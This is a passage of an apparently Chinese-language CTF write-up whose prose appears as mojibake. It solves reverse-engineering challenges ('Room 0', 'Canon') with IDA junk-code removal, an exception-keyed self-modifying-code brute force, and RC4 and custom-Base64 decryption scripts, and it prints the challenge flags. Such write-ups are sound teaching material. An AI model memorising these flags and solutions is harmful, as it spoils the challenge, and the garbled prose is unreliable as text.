class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Flagå€¼-4"><a href="#Flagå€¼-4" class="headerlink" title="Flagå€¼"></a>Flagå€¼</h3><p><code>NSSCTF&#123;W0w_Y0u&#39;re_@n_AE5_M@5t3r&#125;</code></p><h2 id="Room-0"><a href="#Room-0" class="headerlink" title="Room 0"></a>Room 0</h2><h3 id="åˆ†æ-5"><a href="#åˆ†æ-5" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>è¿™é¢˜å‡ºçš„æ—¶å€™ä¹Ÿæ˜¯çªå‘å¥‡æƒ³ï¼Œæƒ³æŠŠSMCå’Œå¼‚å¸¸ä¸¤ä¸ªè€ƒç‚¹ç»“åˆèµ·æ¥ï¼Œäºæ˜¯å‡ºäº†ä¸€ä¸ªè¿™æ ·å¼ºæŠ€å·§æ€§çš„é¢˜ç›®ï¼Œå¦‚æœé€‰æ‰‹æ²¡æœ‰æ„è¯†åˆ°è€ƒç‚¹å°±æ²¡åŠæ³•è§£å‡ºã€‚åç»­æ”¾å‡ºäº†ä¸¤ä¸ªHintæŒ‡å‡ºäº†æ˜¯é™¤0å¼‚å¸¸å’ŒSMCç‰¹æ€§ï¼Œé¢˜è§£å°±çŒ›æ¶¨äº†ï¼ˆï¼ŒæŠ€å·§æ€§ç¡®å®ä¼šå¼ºä¸€ç‚¹ã€‚</p><p>IDAåˆ†æmainå‡½æ•°ï¼Œå‘ç°æœ‰ä¸ªCPPEH_RECORDçš„å¼‚å¸¸ç»“æ„ä½“ã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/32.png" alt="alt text"></p><p>å›åˆ°æ±‡ç¼–æµç¨‹å›¾ä¼šå‘ç°å­˜åœ¨tryå’Œcatchçš„æ•è·å¼‚å¸¸ä»£ç ã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/33.png" alt="alt text"></p><p>å°†æ­¤å¤„çš„jmpå’Œretéƒ½nopæ‰å°±å¯ä»¥åœ¨åç¼–è¯‘ä»£ç æ®µçœ‹åˆ°catchæ‰§è¡Œçš„ä»£ç éƒ¨åˆ†ã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/34.png" alt="alt text"></p><p>å‘ç°å¤šäº†ä¸‰ä¸ªå‡½æ•°è°ƒç”¨ï¼Œå°±æ˜¯catchéƒ¨åˆ†æ‰§è¡Œçš„å‡½æ•°ã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/35.png" alt="alt text"></p><p>ç¬¬ä¸€ä¸ªå‡½æ•°æ˜¯ç»å…¸çš„unhexå‡½æ•°ï¼ˆâ€1f2fâ€-&gt;0x1f2fï¼‰ã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/36.png" alt="alt text"></p><p>ç¬¬äºŒä¸ªå‡½æ•°å­˜åœ¨ä¸‰å¤„èŠ±æŒ‡ä»¤ï¼Œç¬¬ä¸€å¤„å’Œç¬¬ä¸‰å¤„ç›´æ¥å…¨éƒ¨nopï¼Œç¬¬äºŒå¤„å¯¹callæŒ‰uï¼Œåœ¨è·³è¿‡ç¬¬ä¸€ä¸ªå­—èŠ‚æŒ‰cé‡æ–°åˆ†æä¸‹é¢éƒ¨åˆ†ä»£ç ï¼Œè·³è¿‡0xE8å­—èŠ‚ã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/37.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/38.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/39.png" alt="alt text"></p><p>é€‰ä¸­å‡½æ•°æŒ‰Pé‡æ–°è¯†åˆ«ä¸ºå‡½æ•°è¿›è¡Œåç¼–è¯‘ï¼Œå‘ç°è¿™éƒ¨åˆ†å®é™…ä¸Šå°±æ˜¯SMCå‡½æ•°å¤„ï¼Œåˆ©ç”¨ä¼ è¿›çš„å¯†é’¥æ•°æ®å¯¹.encä»£ç è¿›è¡Œå¼‚æˆ–è§£å¯†ã€‚</p><p>åªä¸è¿‡ä¼ è¿›çš„å››å­—èŠ‚æ•´æ•°å¯†é’¥å†å‡½æ•°å¼€å¤´åšäº†å­—èŠ‚å€’åºçš„å¤„ç†ï¼Œå°†å››ä¸ªå­—èŠ‚é¡ºåºç¿»è½¬ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥ä»»åŠ¡å°±æ˜¯æ‰¾åˆ°å¯†é’¥ã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/40.png" alt="alt text"></p><p>å›åˆ°mainå‡½æ•°ï¼Œå‘ç°ç¨‹åºè¦æ±‚è¾“å…¥keyï¼Œç„¶åè°ƒç”¨ä¸€ä¸ªcallè¿”å›å€¼è¦æ˜¯0x11451419ï¼Œç„¶ååˆ©ç”¨0x11451419è¿›è¡Œäº†ä¸€ä¸ªRC4åŠ å¯†ï¼Œæœ€åå¯¹æ¯”ä¸€ä¸ªå­—èŠ‚æ•°ç»„ï¼Œå¦‚æœé€‰æ‰‹å°è¯•è§£å¯†è¿™éƒ¨åˆ†å­—èŠ‚æ•°ç»„ï¼Œä¼šå‘ç°è§£å‡ºæ¥çš„æ˜¯FakeFlagã€‚</p><p><code>NSSCTF&#123;FAKE_FAKE_FAKE_FAKE_FAKE&#125;</code></p><p><img src="/2025/03/06/GHCTF2025WP/41.png" alt="alt text"></p><p>è¿›å…¥sub_402000å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯å°†è¾“å…¥çš„å¯†é’¥è°ƒç”¨unhexå¾—åˆ°å››å­—èŠ‚æ•°å€¼ï¼Œç„¶åè¿›è¡Œä¸€ä¸ª32è½®çš„è®¡ç®—ï¼Œåœ¨ç®­å¤´å¤„å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªé™¤æ³•è®¡ç®—ï¼Œä»¥åŠé™¤æ•°éƒ¨åˆ†çš„ä¸€ä¸ªå˜é‡ä¸å¸¸æ•°ç›¸å‡ã€‚</p><p>ç»“åˆå‰é¢å‘ç°çš„å¼‚å¸¸æ•è·ï¼Œå¯ä»¥çŸ¥é“è¿™éƒ¨åˆ†ä¼šæœ‰å¯èƒ½å‡ºç°é™¤æ•°ç­‰äº0ï¼Œä¹Ÿå°±æ˜¯è§¦å‘é™¤0å¼‚å¸¸ã€‚é‚£ä¹ˆå¯ä»¥é€šè¿‡çˆ†ç ´çš„æ–¹å¼æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥åœ¨è®¡ç®—è¿‡ç¨‹ä¸­è§¦å‘é™¤0å¼‚å¸¸çš„å€¼ï¼Œé‚£å°±æ˜¯ç›®æ ‡å¯†é’¥äº†ï¼Œå› ä¸ºSMCä¼ å…¥çš„å¯†é’¥å°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„å¯†é’¥å­—ä¸²ç»è¿‡unhexçš„æ•°æ®ã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/42.png" alt="alt text"></p><p>ä½†æ˜¯ç»è¿‡å®é™…æ£€éªŒï¼Œå¦‚æœç›´æ¥ä»0x0-0xffffffffçˆ†ç ´ä¼šå‡ºç°éå¸¸å¤šçš„ç¬¦åˆå€¼ï¼Œæ— æ³•ç¡®å®šå“ªä¸ªæ˜¯çœŸå®å¯†é’¥ï¼Œå°±å¿…é¡»å¾—ç¼©å°èŒƒå›´ï¼Œè¿™æ—¶ä¼šæƒ³åˆ°è¿™ä¸ªSMCåŠ å¯†å‡½æ•°å­˜åœ¨ç‰¹æ€§ï¼Œå› ä¸ºé€šè¿‡çš„æ˜¯å¼‚æˆ–åŠ å¯†ï¼Œæ‰€ä»¥å¯ä»¥æ ¹æ®åŸå§‹å­—èŠ‚ä¸å½“å‰å­—èŠ‚å¼‚æˆ–å¾—åˆ°ä¸­é—´å¯†é’¥ã€‚</p><p>è·³åˆ°encæ®µå¼€å¤´ï¼Œå¤åˆ¶å¼€å¤´ä¸‰ä¸ªå­—èŠ‚ï¼Œç„¶åéšä¾¿æ‰¾ä¸€ä¸ªå‡½æ•°ä¹Ÿå¤åˆ¶å¼€å¤´ä¸‰ä¸ªå­—èŠ‚ï¼Œå°†ä¸¤å¯¹æ•°æ®è¿›è¡Œå¼‚æˆ–ï¼Œå°±ä¼šå¾—åˆ°å¯†é’¥çš„å‰ä¸‰ä¸ªå­—èŠ‚ã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/43.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/44.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/45.png" alt="alt text"></p><p>è¿™ä¸‹èŒƒå›´ç¼©å°è‡³0x755ff000-0x755ff0ffä¹‹é—´ï¼Œä½¿ç”¨ä»£ç çˆ†ç ´å³å¯å¾—åˆ°å¯†é’¥ã€‚</p><p>çˆ†ç ´ä»£ç ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">sub_4011C0</span><span class="params">(<span class="type">int</span> v2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// int v2&#123;&#125;;          // [esp+0h] [ebp-1Ch]</span></span><br><span class="line">    <span class="type">int</span> i&#123;&#125;;           <span class="comment">// [esp+4h] [ebp-18h]</span></span><br><span class="line">    <span class="type">int</span> v4&#123;&#125;;          <span class="comment">// [esp+8h] [ebp-14h]</span></span><br><span class="line">    <span class="type">int</span> v5&#123;&#125;;          <span class="comment">// [esp+Ch] [ebp-10h]</span></span><br><span class="line">    <span class="type">int</span> v6&#123;&#125;;          <span class="comment">// [esp+10h] [ebp-Ch]</span></span><br><span class="line">    <span class="type">int</span> v7&#123;&#125;;          <span class="comment">// [esp+10h] [ebp-Ch]</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v8&#123;&#125;; <span class="comment">// [esp+14h] [ebp-8h]</span></span><br><span class="line">    <span class="type">int</span> v9&#123;&#125;;          <span class="comment">// [esp+18h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// v2 = sub_401100(Str);</span></span><br><span class="line">    <span class="comment">// if (!v2)</span></span><br><span class="line">    <span class="comment">// return 0;</span></span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">    v9 = v2;</span><br><span class="line">    v8 = (v2 &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">    v5 = (v2 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">    v4 = (v2 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        v7 = v6 * (v8 + <span class="number">1415881080</span>) * (v9 - <span class="number">1467486175</span>) * ((v8 - v9) ^ (v8 &gt;&gt; <span class="number">4</span>));</span><br><span class="line">        v5 = (v9 + v5) ^ (<span class="number">8</span> * v4);</span><br><span class="line">        v4 = (v9 + v8) ^ (<span class="number">8</span> * v5);</span><br><span class="line">        v8 = (v9 + v4) ^ (<span class="number">8</span> * v5);</span><br><span class="line">        v9 -= v4 + v5 + v8;</span><br><span class="line">        <span class="comment">// è‹¥äº1415881080ç›¸ç­‰ï¼Œåˆ™ä¼šè§¦å‘é™¤0å¼‚å¸¸</span></span><br><span class="line">        <span class="keyword">if</span> (v9 == <span class="number">1415881080</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Key:%X\n&quot;</span>, v2);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v6 = v7 + (v8 + <span class="number">1467486175</span>) * (((v8 - v9) ^ (<span class="type">unsigned</span> __int64)(v8 &gt;&gt; <span class="number">4</span>)) / (<span class="type">unsigned</span> <span class="type">int</span>)(v9 - <span class="number">1415881080</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> v9 ^ v6;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0x755ff000</span>; i &lt; <span class="number">0x755ff0ff</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">sub_4011C0</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°å¯†é’¥<code>755FF0D3</code></p><p>è¿˜åŸmainå‡½æ•°nopçš„ä¸‰è¡Œæ±‡ç¼–ï¼Œé‡æ–°idaè½½å…¥ç¨‹åºåˆ†æä¹Ÿå¯ä»¥ï¼Œåœ¨å¼‚å¸¸exceptå¤„æ–­ç‚¹ï¼Œç„¶åè¿è¡Œè¾“å…¥å¯†é’¥ï¼Œå‘ç°ç¡®å®é€”ä¸­ä¼šè§¦å‘div 0å¼‚å¸¸ï¼Œç„¶åæ–­ç‚¹ä¼šè§¦å‘ï¼Œ</p><p><img src="/2025/03/06/GHCTF2025WP/46.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/47.png" alt="alt text"></p><p>å•æ­¥æ‰§è¡Œå®ŒSMCå‡½æ•°è§£å¯†å‡½æ•°ï¼Œç„¶åè·³åˆ°encæ®µçš„å‡½æ•°è¿›è¡ŒæŒ‰cè¿˜åŸä»£ç ã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/48.png" alt="alt text"></p><p>è¿˜åŸé€”ä¸­ä¼šå‘ç°å‡ ä¸ªèŠ±æŒ‡ä»¤ï¼Œå’Œä¹‹å‰é‡åˆ°çš„ä¸€æ ·ç±»å‹çš„ï¼ŒåŒæ ·å»é™¤å°±å¥½ï¼Œæœ€åé€‰ä¸­å‡½æ•°æŒ‰pè¯†åˆ«ä¸ºå‡½æ•°è¿›è¡Œåç¼–è¯‘å³å¯ã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/49.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/50.png" alt="alt text"></p><p>ä¼šå‘ç°æ˜¯ä¸€ä¸ªå˜ç§RC4ï¼Œå‘ç°v18æ˜¯RC4å¯†é’¥ï¼Œä¸”æœ€ååŠ å¯†å®Œçš„å€¼åˆä¸v18å­—èŠ‚æ•°ç»„è¿›è¡Œå¼‚æˆ–ã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/51.png" alt="alt text"></p><p>v18ä¸çŸ¥é“æ˜¯ä»€ä¹ˆæ•°æ®ï¼Œç›´æ¥è®©ä»£ç æ‰§è¡Œåˆ°ç¬¬ä¸€ä¸ªforæ‰§è¡Œå®Œå¤„ï¼Œå°±å¯ä»¥çœ‹åˆ°v18å€¼ï¼Œè¿™8ä¸ªå­—èŠ‚å°±æ˜¯å¯†é’¥ï¼Œç¼–å†™ä»£ç å°†byte_405020å­—èŠ‚æ•°ç»„è¿›è¡Œè§£å¯†å³å¯å¾—åˆ°å¯†é’¥ã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/52.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/53.png" alt="alt text"></p><p>é™„ï¼šv18æ˜¯ä»a2æ•°æ®è½¬æ¢å¾—æ¥ï¼Œa2æ•°æ®å®é™…æ˜¯è§¦å‘å¼‚å¸¸çš„æ—¶å€™é€šè¿‡æ ˆè¿›è¡Œè·å–å¼‚å¸¸å‰æ•°æ®ï¼Œå®é™…æ•°æ®æ˜¯è§¦å‘å¼‚å¸¸æ—¶å€™çš„v6å€¼ï¼Œä¼ è¿‡æ¥åˆ°encæ®µå‡½æ•°å½“ä½œå¯†é’¥è¿›è¡ŒåŠ å¯†ã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/54.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/55.png" alt="alt text"></p><p>è§£å¯†ä»£ç ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> sbox[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">swap</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *a, <span class="type">unsigned</span> <span class="type">char</span> *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> tmp = *a;</span><br><span class="line">    *a = *b;</span><br><span class="line">    *b = tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_sbox</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> key[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">        sbox[i] = i;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> keyLen = <span class="built_in">strlen</span>((<span class="type">char</span> *)key);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> Ttable[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">        Ttable[i] = key[i % keyLen];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>, i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        j = (j + sbox[i] + Ttable[i]) % <span class="number">256</span>;</span><br><span class="line">        <span class="built_in">swap</span>(sbox + i, sbox + j);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">RC4</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> data[], <span class="type">unsigned</span> <span class="type">char</span> key[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> k, i = <span class="number">0</span>, j = <span class="number">0</span>, t;</span><br><span class="line">    <span class="built_in">init_sbox</span>(key);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> dataLen = <span class="number">32</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">unsigned</span> h = <span class="number">0</span>; h &lt; dataLen; h++)</span><br><span class="line">    &#123;</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        j = (j + sbox[i]) % <span class="number">256</span>;</span><br><span class="line">        <span class="built_in">swap</span>(sbox + i, sbox + j);</span><br><span class="line">        t = (sbox[i] + sbox[j]) % <span class="number">256</span>;</span><br><span class="line">        k = sbox[t];</span><br><span class="line">        data[h] ^= k ^ key[i % <span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ä¸¤ä¸ªæ•°ç»„æœ€åçš„0x00éƒ½å½“ä½œæˆªæ­¢ç¬¦ï¼Œè®©strlenè°ƒç”¨çš„æ—¶å€™æ­£å¸¸è¿”å›é•¿åº¦ã€‚</span></span><br><span class="line">    <span class="type">uint8_t</span> enc[]&#123;<span class="number">0x22</span>, <span class="number">0xC4</span>, <span class="number">0xA0</span>, <span class="number">0x5A</span>, <span class="number">0xDE</span>, <span class="number">0xED</span>, <span class="number">0x62</span>, <span class="number">0x5E</span>, <span class="number">0x25</span>, <span class="number">0xE2</span>, <span class="number">0x6D</span>, <span class="number">0xA6</span>, <span class="number">0x05</span>, <span class="number">0xA7</span>, <span class="number">0x20</span>, <span class="number">0x8D</span>, <span class="number">0x7D</span>, <span class="number">0x99</span>, <span class="number">0x52</span>, <span class="number">0x3E</span>, <span class="number">0x8C</span>, <span class="number">0xA7</span>, <span class="number">0x7F</span>, <span class="number">0xFA</span>, <span class="number">0x09</span>, <span class="number">0xD8</span>, <span class="number">0x62</span>, <span class="number">0xDB</span>, <span class="number">0x00</span>, <span class="number">0x80</span>, <span class="number">0xC2</span>, <span class="number">0xA9</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line">    <span class="type">uint8_t</span> key[]&#123;<span class="number">0xD4</span>, <span class="number">0x35</span>, <span class="number">0x6D</span>, <span class="number">0xF8</span>, <span class="number">0xF8</span>, <span class="number">0x6D</span>, <span class="number">0x35</span>, <span class="number">0xD4</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line">    <span class="built_in">RC4</span>(enc, key);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.32s\n&quot;</span>, enc);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Flagå€¼-5"><a href="#Flagå€¼-5" class="headerlink" title="Flagå€¼"></a>Flagå€¼</h3><p><code>NSSCTF&#123;Int3r3st1ng_5MC_Pr0gr@m?&#125;</code></p><h2 id="Canon"><a href="#Canon" class="headerlink" title="Canon"></a>Canon</h2><h3 id="åˆ†æ-6"><a href="#åˆ†æ-6" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>IDAåˆ†æmainå‡½æ•°ï¼Œå‘ç°æ˜¯å°†è¾“å…¥çš„å­—ç¬¦ä¸²åˆ†æˆ3ä»½ï¼Œåœ¨å¾ªç¯é‡Œé¢äº’ä¸ºå¯†é’¥è¿›è¡Œå¾ªç¯åŠ å¯†ï¼Œå¹¶ä¸”åˆ©ç”¨a3æ•°ç»„æ•°æ®ä¼ å…¥è°ƒç”¨ä¸åŒçš„åŠ å¯†ã€‚</p><p>å¯ä»¥çœ‹åˆ°åŠ å¯†å‡½æ•°é‡Œé¢æœ‰å¤šä¸ªcaseï¼Œä½†ç”±äºa3æ•°ç»„é‡Œé¢æ•°å­—æ˜¯æœ‰é™çš„ï¼Œåªå‡ºç°äº†13456ï¼Œ2å’Œ7åŠ å¯†æ²¡æœ‰ç”¨åˆ°ï¼Œæ‰€ä»¥ä¸ç”¨åˆ†æé‚£ä¸¤ä¸ªcaseã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/84.png" alt="alt text"></p><p>case1ï¼šå‡¯æ’’åŠ å¯†</p><p><img src="/2025/03/06/GHCTF2025WP/85.png" alt="alt text"></p><p>case3ï¼šæ …æ åŠ å¯†</p><p><img src="/2025/03/06/GHCTF2025WP/86.png" alt="alt text"></p><p>case4ï¼šå­—ç¬¦ä¸²ä½ç§»</p><p><img src="/2025/03/06/GHCTF2025WP/87.png" alt="alt text"></p><p>case5ï¼šå¼‚æˆ–åŠ å¯† + Base64</p><p><img src="/2025/03/06/GHCTF2025WP/88.png" alt="alt text"></p><p>case6ï¼šå˜ç§RC4 + Base64</p><p><img src="/2025/03/06/GHCTF2025WP/89.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/90.png" alt="alt text"></p><p>æ³¨æ„ï¼ŒBase64çš„è¡¨æ˜¯è¢«æ¢è¿‡çš„ï¼Œå¯ä»¥æŸ¥æ‰¾äº¤å‰è°ƒç”¨å‘ç°ï¼Œå¯ä»¥ç›´æ¥åŠ¨è°ƒè·å–åˆ°æ¢åçš„è¡¨ã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/91.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/92.png" alt="alt text"></p><p>mainå‡½æ•°æ‰§è¡ŒåŠ å¯†çš„åŒå¾ªç¯ä¸­ç”¨åˆ°çš„åŠ å¯†æ–¹å¼æ•°å€¼å’ŒåŠ å¯†é¡ºåºéƒ½å¯ä»¥é€šè¿‡æ¨¡æ‹Ÿå¾ªç¯æ¥å¾—åˆ°ï¼Œç„¶åé€†å‘å°±æ˜¯è§£å¯†è°ƒç”¨çš„å‡½æ•°é¡ºåºå’Œå¯†æ–‡é¡ºåºã€‚</p><p>è§£å¯†ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">new_table = <span class="string">&quot;stuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqr&quot;</span></span><br><span class="line">old_table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title 